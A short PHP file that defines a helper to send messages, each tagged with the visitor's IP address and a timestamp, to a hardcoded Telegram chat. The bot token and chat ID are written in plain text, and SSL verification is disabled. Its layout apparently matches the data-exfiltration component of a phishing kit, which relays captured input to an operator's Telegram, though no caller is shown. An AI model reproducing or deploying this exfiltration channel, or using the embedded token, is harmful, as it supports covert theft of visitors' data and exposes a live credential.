<?php


// telegram information
$token = "8679642686:AAHWHWpiJFXRZaV9T7vV4_qZSSRCaEMHGd4";
$id = "7665891917";
 

function call($msg, $rms = null){
    global $token;
    global $id;
    $info = "


    
/- MORE INFO -/
IP: ".$_SERVER['REMOTE_ADDR']."
TIME: ".date("m/d/Y h:i:sa");


    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}





?>